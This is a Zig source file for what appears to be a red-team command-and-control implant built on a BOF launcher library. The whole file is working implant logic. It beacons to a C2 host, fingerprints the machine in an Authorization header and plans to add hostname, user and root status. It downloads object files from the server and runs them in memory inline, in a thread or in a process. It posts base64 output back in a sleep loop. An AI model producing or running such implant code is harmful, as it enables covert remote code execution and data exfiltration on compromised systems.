const std = @import("std");
const assert = std.debug.assert;
const bof = @import("bof_launcher_api");

pub const std_options = .{
    .http_disable_tls = true,
    .log_level = .info,
};
const c2_host = "127.0.0.1:8000";
const c2_endpoint = "/endpoint";
const jitter = 3;

const debug_proxy_enabled = false;
const debug_proxy_host = "127.0.0.1";
const debug_proxy_port = 8080;

fn fetchBofContent(allocator: std.mem.Allocator, state: *State, bof_uri: []const u8) ![]const u8 {
    var headers = std.http.Headers.init(allocator);
    defer headers.deinit();

    const uri = try std.fmt.allocPrint(allocator, "http://{s}{s}", .{ c2_host, bof_uri });
    defer allocator.free(uri);

    const bof_url = try std.Uri.parse(uri);

    var bof_req = try state.http_client.open(.GET, bof_url, headers, .{});
    defer bof_req.deinit();

    try bof_req.send(.{});
    try bof_req.wait();

    if (bof_req.response.status != .ok) {
        std.log.err("Expected response status '200 OK' got '{} {s}'", .{
            @intFromEnum(bof_req.response.status),
            bof_req.response.status.phrase() orelse "",
        });
        return error.NetworkError;
    }

    const bof_content_type = bof_req.response.headers.getFirstValue("Content-Type") orelse {
        std.log.err("Missing 'Content-Type' header", .{});
        return error.NetworkError;
    };

    if (!std.ascii.eqlIgnoreCase(bof_content_type, "application/octet-stream")) {
        std.log.err(
            "Expected 'Content-Type: application/octet-stream' got '{s}'",
            .{bof_content_type},
        );
        return error.NetworkError;
    }

    const bof_content = try allocator.alloc(u8, @intCast(bof_req.response.content_length.?));
    errdefer allocator.free(bof_content);

    const n = try bof_req.readAll(bof_content);
    if (n != bof_content.len)
        return error.NetworkError;

    return bof_content;
}

const State = struct {
    base64_decoder: std.base64.Base64Decoder,
    base64_encoder: std.base64.Base64Encoder,
    http_client: std.http.Client,
    http_proxy: if (debug_proxy_port) std.http.Client.Proxy else void,
    heartbeat_header: std.http.Headers,
    heartbeat_uri: std.Uri,
    pending_bofs: std.ArrayList(PendingBof),
    persistent_bofs: std.AutoHashMap(u64, bof.Object),

    fn init(allocator: std.mem.Allocator) !State {
        const base64_decoder = std.base64.Base64Decoder.init(std.base64.standard_alphabet_chars, '=');
        const base64_encoder = std.base64.Base64Encoder.init(std.base64.standard_alphabet_chars, '=');

        var heartbeat_header = std.http.Headers.init(allocator);

        {
            const target = try std.zig.system.resolveTargetQuery(.{ .cpu_model = .baseline });
            const arch_name = target.cpu.model.name;
            const os_name = @tagName(target.os.tag);

            // TODO: Authorization: base64(ipid=arch:OS:hostname:internalIP:externalIP:currentUser:isRoot)
            const authz = try std.mem.join(allocator, "", &.{ arch_name, ":", os_name });
            defer allocator.free(authz);

            const authz_b64 = try allocator.alloc(u8, base64_encoder.calcSize(authz.len));
            defer allocator.free(authz_b64);

            _ = std.base64.Base64Encoder.encode(&base64_encoder, authz_b64, authz);
            try heartbeat_header.append("Authorization", authz_b64);
        }

        const http_proxy = if (debug_proxy_port) blk: {
            const proxy = try allocator.create(std.http.Client.Proxy);
            proxy.* = .{
                .allocator = allocator,
                .headers = heartbeat_header,
                .protocol = .plain,
                .host = debug_proxy_host,
                .port = debug_proxy_port,
            };
            break :blk proxy;
        } else {};

        const http_client: std.http.Client = .{
            .allocator = allocator,
            .http_proxy = http_proxy,
        };

        return State{
            .base64_decoder = base64_decoder,
            .base64_encoder = base64_encoder,
            .http_client = http_client,
            .heartbeat_header = heartbeat_header,
            .heartbeat_uri = try std.Uri.parse("http://" ++ c2_host ++ c2_endpoint),
            .pending_bofs = std.ArrayList(PendingBof).init(allocator),
            .persistent_bofs = std.AutoHashMap(u64, bof.Object).init(allocator),
        };
    }

    fn deinit(state: *State) void {
        state.http_client.deinit();
        state.heartbeat_header.deinit();
        state.pending_bofs.deinit();
        state.persistent_bofs.deinit();
        state.* = undefined;
    }
};

const PendingBof = struct {
    context: ?*bof.Context = null,
    request_id: []const u8,
    is_persistent: bool = false,
    launcher_error_code: i32 = 0,
};

fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.json.Value) !void {
    const bof_args = if (root.object.get("args")) |value| bof_args: {
        const len = try state.base64_decoder.calcSizeForSlice(value.string);
        const bof_args = try allocator.alloc(u8, len);
        errdefer allocator.free(bof_args);
        _ = try state.base64_decoder.decode(bof_args, value.string);
        break :bof_args bof_args;
    } else null;
    defer if (bof_args) |args| allocator.free(args);

    // process header { exec_mode, args_spec, hash, [persistence] }
    //
    const bof_header = root.object.get("header").?.string;
    var bof_header_iter = std.mem.splitScalar(u8, bof_header, ':');

    // get hint regarding execution mode
    const exec_mode = bof_header_iter.next() orelse return error.BadData;

    // get arguments specification string
    const args_spec = bof_header_iter.next() orelse return error.BadData;
    _ = args_spec;

    // get BOF's hash
    const hash = try std.fmt.parseInt(u64, bof_header_iter.next() orelse return error.BadData, 16);
    std.log.info("Received hash: 0x{x}", .{hash});

    // keep BOF in memory after running it?
    const is_persistent = if (bof_header_iter.next()) |v| std.mem.eql(u8, v, "persist") else false;

    // TODO: handle 'buffers'

    var is_loaded: bool = false;
    var bof_to_exec: bof.Object = undefined;
    if (state.persistent_bofs.get(hash)) |b| {
        std.log.info("Re-using existing persistent BOF (hash: 0x{x})", .{hash});
        bof_to_exec = b;
        is_loaded = true;
    } else {
        // we need to fetch BOF file content from C2 sever
        const bof_path = root.object.get("path").?.string;
        const bof_content = try fetchBofContent(allocator, state, bof_path);
        defer allocator.free(bof_content);

        bof_to_exec = try bof.Object.initFromMemory(bof_content);
        errdefer bof_to_exec.release();

        if (is_persistent) {
            try state.persistent_bofs.put(hash, bof_to_exec);
            std.log.info("Loaded new persistent BOF (hash: 0x{x})", .{hash});
        }
    }

    var bof_context: ?*bof.Context = null;
    errdefer if (bof_context) |context| context.release();

    if (std.mem.eql(u8, exec_mode, "inline")) {
        std.log.info("Execution mode: {s}-based", .{exec_mode});

        bof_context = try bof_to_exec.run(@constCast(bof_args));
    } else if (std.mem.eql(u8, exec_mode, "thread")) {
        std.log.info("Execution mode: {s}-based", .{exec_mode});

        bof_context = try bof_to_exec.runAsyncThread(
            @constCast(bof_args),
            null,
            null,
        );
    } else if (std.mem.eql(u8, exec_mode, "process")) {
        std.log.info("Execution mode: {s}-based", .{exec_mode});

        bof_context = try bof_to_exec.runAsyncProcess(
            @constCast(bof_args),
            null,
            null,
        );
    }

    if (bof_context) |context| {
        try state.pending_bofs.append(.{
            .context = context,
            .request_id = try allocator.dupe(u8, root.object.get("id").?.string),
            .is_persistent = is_persistent,
        });
    } else return error.FailedToRunBof;
}

fn processCommands(allocator: std.mem.Allocator, state: *State) !void {
    // send heartbeat to C2 and check if any tasks are pending
    var req = try state.http_client.open(.GET, state.heartbeat_uri, state.heartbeat_header, .{});
    defer req.deinit();

    try req.send(.{});
    try req.wait();

    if (req.response.status != .ok) {
        std.log.err("Expected response status '200 OK' got '{} {s}'", .{
            @intFromEnum(req.response.status),
            req.response.status.phrase() orelse "",
        });
        return error.NetworkError;
    }

    const content_type = req.response.headers.getFirstValue("Content-Type") orelse {
        std.log.err("Missing 'Content-Type' header", .{});
        return error.NetworkError;
    };

    // task received from C2?
    if (std.ascii.eqlIgnoreCase(content_type, "application/json")) {
        const resp_content = try allocator.alloc(u8, @intCast(req.response.content_length.?));
        defer allocator.free(resp_content);

        _ = try req.readAll(resp_content);

        var parsed = try std.json.parseFromSlice(std.json.Value, allocator, resp_content, .{});
        defer parsed.deinit();

        // check type of task to execute:
        // bof - execute bof
        // cmd - execute builtin command (like: sleep 10)
        var root = parsed.value;
        const task = root.object.get("name").?.string;
        const request_id = root.object.get("id").?.string;

        var iter_task = std.mem.splitScalar(u8, task, ':');
        const cmd_prefix = iter_task.next() orelse return error.BadData;
        const cmd_name = iter_task.next() orelse return error.BadData;

        // tasked for BOF execution?
        if (std.mem.eql(u8, cmd_prefix, "bof")) {
            std.log.info("Executing bof: {s}", .{cmd_name});

            receiveAndLaunchBof(allocator, state, root) catch |err| {
                try state.pending_bofs.append(.{
                    .request_id = try allocator.dupe(u8, request_id),
                    // TODO: Error codes may change in Zig, this is hacky.
                    .launcher_error_code = @abs(@intFromError(err)) - 1000,
                });
            };
            // tasked for custom command execution?
        } else if (std.mem.eql(u8, cmd_prefix, "cmd")) {
            std.log.info("Executing builtin command: {s}", .{cmd_name});

            if (std.mem.eql(u8, cmd_name, "release_persistent_bofs")) {
                var it = state.persistent_bofs.valueIterator();
                while (it.next()) |v| {
                    const bof_object = v.*;
                    bof_object.release();
                }
                state.persistent_bofs.clearAndFree();
            }
        }
    }
}

fn generateUserAgentString(allocator: std.mem.Allocator, bof_exit_code_or_launcher_error: i32) ![]const u8 {
    return try std.fmt.allocPrint(allocator, "result:{d}", .{bof_exit_code_or_launcher_error});
}

fn processPendingBofs(allocator: std.mem.Allocator, state: *State) !void {
    var pending_bof_index: usize = 0;
    while (pending_bof_index != state.pending_bofs.items.len) {
        const pending_bof = state.pending_bofs.items[pending_bof_index];

        if (pending_bof.context != null and pending_bof.context.?.isRunning()) {
            pending_bof_index += 1;
        } else {
            const bof_exit_code_or_launcher_error: i32 = if (pending_bof.context) |context|
                @intCast(context.getExitCode())
            else
                pending_bof.launcher_error_code;

            const result_str = try generateUserAgentString(allocator, bof_exit_code_or_launcher_error);
            defer allocator.free(result_str);

            var headers = std.http.Headers.init(allocator);
            defer headers.deinit();
            try headers.append("Content-Type", "text/plain");
            try headers.append("Authorization", pending_bof.request_id);
            try headers.append("User-Agent", result_str);

            var request = try state.http_client.open(.POST, state.heartbeat_uri, headers, .{});
            defer request.deinit();

            if (pending_bof.context) |context| {
                if (context.getOutput()) |output| {
                    const out_b64 = try allocator.alloc(u8, state.base64_encoder.calcSize(output.len));
                    defer allocator.free(out_b64);

                    _ = state.base64_encoder.encode(out_b64, output);

                    request.transfer_encoding = .{ .content_length = out_b64.len };

                    try request.send(.{});
                    try request.writeAll(out_b64);
                    try request.finish();

                    std.log.info("Bof exit code sent: {d}", .{bof_exit_code_or_launcher_error});
                    std.log.info("Bof output sent:\n{s}", .{output});
                } else {
                    try request.send(.{});

                    std.log.info("Bof exit code sent: {d}", .{bof_exit_code_or_launcher_error});
                }

                if (!pending_bof.is_persistent)
                    context.getObject().release();

                context.release();
            } else {
                try request.send(.{});

                std.log.info("Bof launcher error code sent: {d}", .{bof_exit_code_or_launcher_error});
            }
            try request.wait();

            allocator.free(pending_bof.request_id);
            _ = state.pending_bofs.swapRemove(pending_bof_index);
        }
    }
}

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    var state = try State.init(allocator);
    defer state.deinit();

    try bof.initLauncher();
    defer bof.releaseLauncher();

    while (true) {
        processCommands(allocator, &state) catch {};
        processPendingBofs(allocator, &state) catch {};
        std.time.sleep(jitter * 1e9);
    }
}
